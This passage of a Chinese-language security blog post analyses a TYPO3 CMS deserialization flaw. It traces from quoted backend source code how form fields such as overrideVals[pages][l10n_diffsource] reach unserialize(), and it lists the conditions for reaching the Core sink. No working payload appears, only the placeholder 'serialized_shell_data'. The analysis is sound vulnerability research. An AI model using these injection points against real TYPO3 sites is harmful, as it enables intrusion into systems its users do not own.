省略代码...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，通过调用<code>FormDataCompiler</code>的<code>compile</code>方法，将<code>$initialData</code>中的数据存储到了<code>$result</code>中。</p><p>再往前走，来到了<code>EditDocumentController</code>类中的<code>makeEditForm</code>方法中。</p><p><img src="https://image.mengsec.com/typo3/6.png" alt="image-20190730184503789"></p><p>在这里，<code>$formDataCompilerInput[&#39;overrideValues&#39;]</code>获取了<code>$this-&gt;overrideVals[$table]</code>中的数据。</p><p>而<code>$this-&gt;overrideVals</code>的值是在方法<code>preInit</code>中设定的，获取的是通过<code>POST</code>传入的表单中的键值对。</p><p><img src="https://image.mengsec.com/typo3/7.png" alt="image-20190730185126823"></p><p>这样一来，在这个请求过程中，进行反序列化的字符串我们就可以控制了。</p><p>在表单中提交任意符合数组格式的输入，在后端代码中都会被解析，然后后端根据<code>TCA</code>来进行判断并处理。<br>比如我们在提交表单中新增一个名为<code>a[b][c][d]</code>，值为<code>233</code>的表单项。</p><p><img src="https://image.mengsec.com/typo3/8.png" alt="image-20190730143618569"></p><p>在编辑表单的控制器<code>EditDocumentController.php</code>中下一个断点，提交之后。</p><p><img src="https://image.mengsec.com/typo3/9.png" alt="image-20190730143103245"></p><p>可以看到我们传入的键值对在经过<code>getParsedBody</code>方法解析后，变成了嵌套的数组，并且没有任何限制。</p><p>我们只需要在表单中传入<code>overrideVals</code>这一个数组即可。这个数组中的具体的键值对，则需要看进行反序列化时取的<code>$result[&#39;databaseRow&#39;]</code>中的哪一个键值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$languageField</span>]) &amp;&amp; <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$languageField</span>] &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>]) &amp;&amp; <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$fieldWithUidOfDefaultRecord</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 省略代码</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]])) &#123;<br>        <span class="hljs-variable">$defaultLanguageKey</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>] . <span class="hljs-string">&#x27;:&#x27;</span> . (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;uid&#x27;</span>];<br>        <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;defaultLanguageDiffRow&#x27;</span>][<span class="hljs-variable">$defaultLanguageKey</span>] = unserialize(<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;processedTca&#x27;</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]]);<br>    &#125;<br>    <span class="hljs-comment">//省略代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>要想进入反序列化的点，还需要满足上面的<code>if</code>条件，动态调一下就可以知道，在<code>if</code>语句中调用的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;sys_language_uid&#x27;</span>]<br><span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;l10n_parent&#x27;</span>]<br></code></pre></td></tr></table></figure><p>后面反序列化中调用的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;databaseRow&#x27;</span>][<span class="hljs-string">&#x27;l10n_diffsource&#x27;</span>]<br></code></pre></td></tr></table></figure><p>因此，我们只需要在传入的表单中增加三个参数即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">overrideVals[pages][sys_language_uid] ==&gt; <span class="hljs-number">4</span><br>overrideVals[pages][l10n_parent] ==&gt; <span class="hljs-number">4</span><br>overrideVals[pages][l10n_diffsource] ==&gt; serialized_shell_data<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/typo3/10.png" alt="image-20190730215227968"></p><p>可以看到，我们的输入成功的到达了反序列化的点。</p><h3 id="4-3-Core-ext-漏洞点利用过程分析"><a href="#4-3-Core-ext-漏洞点利用过程分析" class="headerlink" title="4.3 Core ext 漏洞点利用过程分析"></a>4.3 Core ext 漏洞点利用过程分析</h3><p>看下<code>Core</code>中的那个漏洞点。</p><p>路径：<code>typo3/sysext/core/Classes/DataHandling/DataHandler.php:1453</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fillInFieldArray</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$fieldArray</span>, <span class="hljs-variable">$incomingFieldArray</span>, <span class="hljs-variable">$realPid</span>, <span class="hljs-variable">$status</span>, <span class="hljs-variable">$tscPID</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Initialize:</span><br>    <span class="hljs-variable">$originalLanguageRecord</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable">$originalLanguage_diffStorage</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable">$diffStorageFlag</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// Setting &#x27;currentRecord&#x27; and &#x27;checkValueRecord&#x27;:</span><br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$id</span>, <span class="hljs-string">&#x27;NEW&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-comment">// Must have the &#x27;current&#x27; array - not the values after processing below...</span><br>        <span class="hljs-variable">$checkValueRecord</span> = <span class="hljs-variable">$fieldArray</span>;<br>        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$incomingFieldArray</span>) &amp;&amp; is_array(<span class="hljs-variable">$checkValueRecord</span>)) &#123;<br>            ArrayUtility::mergeRecursiveWithOverrule(<span class="hljs-variable">$checkValueRecord</span>, <span class="hljs-variable">$incomingFieldArray</span>);<br>        &#125;<br>        <span class="hljs-variable">$currentRecord</span> = <span class="hljs-variable">$checkValueRecord</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// We must use the current values as basis for this!</span><br>        <span class="hljs-variable">$currentRecord</span> = (<span class="hljs-variable">$checkValueRecord</span> = <span class="hljs-keyword">$this</span>-&gt;recordInfo(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$id</span>, <span class="hljs-string">&#x27;*&#x27;</span>));<br>        <span class="hljs-comment">// This is done to make the pid positive for offline versions; Necessary to have diff-view for page translations in workspaces.</span><br>        BackendUtility::fixVersioningPid(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$currentRecord</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Get original language record if available:</span><br>    <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$currentRecord</span>)<br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]<br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>]<br>        &amp;&amp; <span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>]] &gt; <span class="hljs-number">0</span><br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>]<br>        &amp;&amp; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>]] &gt; <span class="hljs-number">0</span><br>       ) &#123;<br>        <span class="hljs-variable">$originalLanguageRecord</span> = <span class="hljs-keyword">$this</span>-&gt;recordInfo(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>]], <span class="hljs-string">&#x27;*&#x27;</span>);<br>        BackendUtility::workspaceOL(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$originalLanguageRecord</span>);<br>        <span class="hljs-variable">$originalLanguage_diffStorage</span> = unserialize(<span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]]);<br>    &#125;<br>    ......<span class="hljs-comment">//省略代码</span><br></code></pre></td></tr></table></figure><p>看代码，如果我们要进入反序列化的点，需要满足前面的<code>if</code>条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$currentRecord</span>)<br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigDiffSourceField&#x27;</span>]<br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>]<br>        &amp;&amp; <span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;languageField&#x27;</span>]] &gt; <span class="hljs-number">0</span><br>        &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>]<br>        &amp;&amp; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$currentRecord</span>[<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;TCA&#x27;</span>][<span class="hljs-variable">$table</span>][<span class="hljs-string">&#x27;ctrl&#x27;</span>][<span class="hljs-string">&#x27;transOrigPointerField&#x27;</span>]] &gt; <span class="hljs-number">0</span><br>    ) <br></code></pre></td></tr></table></figure><p>也就是说要满足以下条件</p><ul><li><code>$currentRecord</code>是个数组</li><li>在<code>TCA</code>中<code>$table</code>的表属性中存在<code>transOrigDiffSourceField</code>、<code>languageField</code>、<code>transOrigPointerField</code>字段。</li><li><code>$table</code>的属性<code>languageField</code>和<code>transOrigPointerField</code>在<code>$currentRecord</code>中对应的值要大于<code>0</code>。</li></ul><p>查一下<code>TCA</code>表，满足第二条条件的表有</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sys_file_reference<br>sys_file_metadata<br>sys_file_collection<br>sys_collection<br>sys_category<br>pages<br></code></pre></td></tr></table></figure><p>但是所有<code>sys_*</code>的字段的<code>adminOnly</code>属性的值都是<code>1</code>，只有管理员权限才可以更改。因此我们可以用的表只有<code>pages</code>。</p><p>它的属性值是</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[languageField]</span> =&gt; sys_language_uid<br><span class="hljs-string">[transOrigPointerField]</span> =&gt; l10n_parent<br><span class="hljs-string">[transOrigDiffSourceField]</span> =&gt; l10n_diffsource<br></code></pre></td></tr></table></figure><p>再往上，有一个对传入的参数进行处理的<code>if-else</code>语句。</p><p>从注释中，我们可以知道传入的各个参数的功能：</p><ul><li><p>数组 <code>$fieldArray</code> 是默认值，这种一般都是我们无法控制的</p></li><li><p>数组 <code>$incomingFieldArray</code> 是你想要设置的字段值，如果可以，它会合并到<code>$fieldArray</code>中。</p></li></ul><p>而且如果满足<code>if (strpos($id, &#39;NEW&#39;) !== false)</code>条件的话，也就是<code>$id</code>是一个字符串且其中存在<code>NEW</code>字符串，会进入下面的合并操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$checkValueRecord</span> = <span class="hljs-variable">$fieldArray</span>;<br>......<br><span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$incomingFieldArray</span>) &amp;&amp; is_array(<span class="hljs-variable">$checkValueRecord</span>)) &#123;<br>ArrayUtility::mergeRecursiveWithOverrule(<span class="hljs-variable">$checkValueRecord</span>, <span class="hljs-variable">$incomingFieldArray</span>);<br>&#125;<br><span class="hljs-variable">$currentRecord</span> = <span class="hljs-variable">$checkValueRecord</span>;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/typo3/11.png" alt="image-20190730124409993"></p><p>如果不满足上面的<code>if</code>条件，<code>$currentRecord</code>的值就会通过<code>recordInfo</code>方法从数据库中直接获取。这样后面我们就无法利用了。</p><p>简单总结一下，我们需要</p><ul><li><code>$table</code>是<code>pages</code></li><li><code>$id</code>是个字符串，而且存在<code>NEW</code>字符串</li><li><code>$incomingFieldArray</code>中要存在<code>payload</code></li></ul><p>接下来我们看在哪里对该函数进行了调用。</p><p>全局搜索一下，只找到一处，在<code>typo3/sysext/core/Classes/DataHandling/DataHandler.php:954</code>处的<code>process_datamap</code>方法中进行了调用。</p><p><img src="https://image.mengsec.com/typo3/12.png" alt="image-20190730141311695"></p><p>整个项目中，对<code>process_datamap</code>调用的地方就太多了，尝试使用<code>xdebug</code>动态调试来找一下调用链。从<code>RIPS</code>团队的那一篇分析文章结合上面的对表名的分析，我们可以知道，漏洞点在创建<code>page</code>的功能处。</p><p>接下来就是找从<code>EditDocumentController.php</code>的<code>mainAction</code>方法到前面我们分析的<code>fillInFieldArray</code>方法的调用链。</p><p>尝试在网站中新建一个<code>page</code>，然后在调用<code>fillInFieldArray</code>的位置下一个断点，发送请求后，我们就拿到了调用链。</p><p><img src="https://image.mengsec.com/typo3/13.png" alt="image-20190730173552616"></p><p>看一下<code>mainAction</code>的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mainAction</span>(<span class="hljs-params">ServerRequestInterface <span class="hljs-variable">$request</span></span>): <span class="hljs-title">ResponseInterface</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Unlock all locked records</span><br>    BackendUtility::lockRecords();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$response</span> = <span class="hljs-keyword">$this</span>-&gt;preInit(<span class="hljs-variable">$request</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Process incoming data via DataHandler?</span><br>    <span class="hljs-variable">$parsedBody</span> = <span class="hljs-variable">$request</span>-&gt;getParsedBody();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;doSave<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedok&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_saveandclosedok&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedokview&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedoknew&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_duplicatedoc&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$response</span> = <span class="hljs-keyword">$this</span>-&gt;processData(<span class="hljs-variable">$request</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>        &#125;<br>    &#125;<br>    ....<span class="hljs-comment">//省略代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当满足<code>if</code>条件是进入目标<code>$response = $this-&gt;processData($request)</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;doSave<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedok&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_saveandclosedok&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedokview&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_savedoknew&#x27;</span>])<br>        || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;_duplicatedoc&#x27;</span>])<br>    ) <br></code></pre></td></tr></table></figure><p>这个在新建一个<code>page</code>时，正常的表单中就携带<code>doSave == 1</code>，而<code>doSave</code>的值就是在方法<code>preInit</code>中获取的。</p><p><img src="https://image.mengsec.com/typo3/14.png" alt="image-20190730153630122"></p><p>这样条件默认就是成立的，然后将<code>$request</code>传入了<code>processData</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">processData</span>(<span class="hljs-params">ServerRequestInterface <span class="hljs-variable">$request</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">ResponseInterface</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// @deprecated Variable can be removed in TYPO3 v10.0</span><br>    <span class="hljs-variable">$deprecatedCaller</span> = <span class="hljs-literal">false</span>;<br>    <br>......<span class="hljs-comment">//省略代码</span><br>    <span class="hljs-variable">$parsedBody</span> = <span class="hljs-variable">$request</span>-&gt;getParsedBody(); <span class="hljs-comment">// 获取Post请求参数</span><br>    <span class="hljs-variable">$queryParams</span> = <span class="hljs-variable">$request</span>-&gt;getQueryParams(); <span class="hljs-comment">// 获取Get请求参数</span><br><br>    <span class="hljs-variable">$beUser</span> = <span class="hljs-keyword">$this</span>-&gt;getBackendUser(); <span class="hljs-comment">// 获取用户数据</span><br><br>    <span class="hljs-comment">// Processing related GET / POST vars</span><br>    <span class="hljs-keyword">$this</span>-&gt;data = <span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;data&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;data&#x27;</span>] ?? [];<br>    <span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] ?? [];<br>    <span class="hljs-keyword">$this</span>-&gt;mirror = <span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;mirror&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;mirror&#x27;</span>] ?? [];<br>    <span class="hljs-comment">// @deprecated property cacheCmd is unused and can be removed in TYPO3 v10.0</span><br>    <span class="hljs-keyword">$this</span>-&gt;cacheCmd = <span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;cacheCmd&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;cacheCmd&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// @deprecated property redirect is unused and can be removed in TYPO3 v10.0</span><br>    <span class="hljs-keyword">$this</span>-&gt;redirect = <span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;redirect&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">$this</span>-&gt;returnNewPageId = (<span class="hljs-keyword">bool</span>)(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;returnNewPageId&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;returnNewPageId&#x27;</span>] ?? <span class="hljs-literal">false</span>);<br><br>    <span class="hljs-comment">// Only options related to $this-&gt;data submission are included here</span><br>    <span class="hljs-variable">$tce</span> = GeneralUtility::makeInstance(DataHandler::class);<br><br>    <span class="hljs-variable">$tce</span>-&gt;setControl(<span class="hljs-variable">$parsedBody</span>[<span class="hljs-string">&#x27;control&#x27;</span>] ?? <span class="hljs-variable">$queryParams</span>[<span class="hljs-string">&#x27;control&#x27;</span>] ?? []);<br><br>    <span class="hljs-comment">// Set internal vars</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$beUser</span>-&gt;uc[<span class="hljs-string">&#x27;neverHideAtCopy&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$beUser</span>-&gt;uc[<span class="hljs-string">&#x27;neverHideAtCopy&#x27;</span>]) &#123;<br>        <span class="hljs-variable">$tce</span>-&gt;neverHideAtCopy = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// Load DataHandler with data</span><br>    <span class="hljs-variable">$tce</span>-&gt;start(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-keyword">$this</span>-&gt;cmd);<br>    <span class="hljs-keyword">if</span> (is_array(<span class="hljs-keyword">$this</span>-&gt;mirror)) &#123;<br>        <span class="hljs-variable">$tce</span>-&gt;setMirror(<span class="hljs-keyword">$this</span>-&gt;mirror);<br>    &#125;<br><br>    <span class="hljs-comment">// Perform the saving operation with DataHandler:</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;doSave === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable">$tce</span>-&gt;process_uploads(<span class="hljs-variable">$_FILES</span>);<br>        <span class="hljs-variable">$tce</span>-&gt;process_datamap();<br>        <span class="hljs-variable">$tce</span>-&gt;process_cmdmap();<br>    &#125;<br>    ......<span class="hljs-comment">//省略代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>代码很容易懂，从<code>$request</code>中解析出来的数据，首先存储在<code>$this-&gt;data</code>和<code>$this-&gt;cmd</code>中，然后实例化一个名为<code>$tce</code>，调用<code>$tce-&gt;start</code>方法将传入的数据存储在其自身的成员<code>datamap</code>和<code>cmdmap</code>中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">typo3/sysext/core/Classes/DataHandling/DataHandler.php:<span class="hljs-number">735</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">start</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$altUserObject</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>   ......<span class="hljs-comment">//省略代码</span><br>    <span class="hljs-comment">// Setting the data and cmd arrays</span><br>    <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$data</span>)) &#123;<br>        reset(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;datamap = <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> 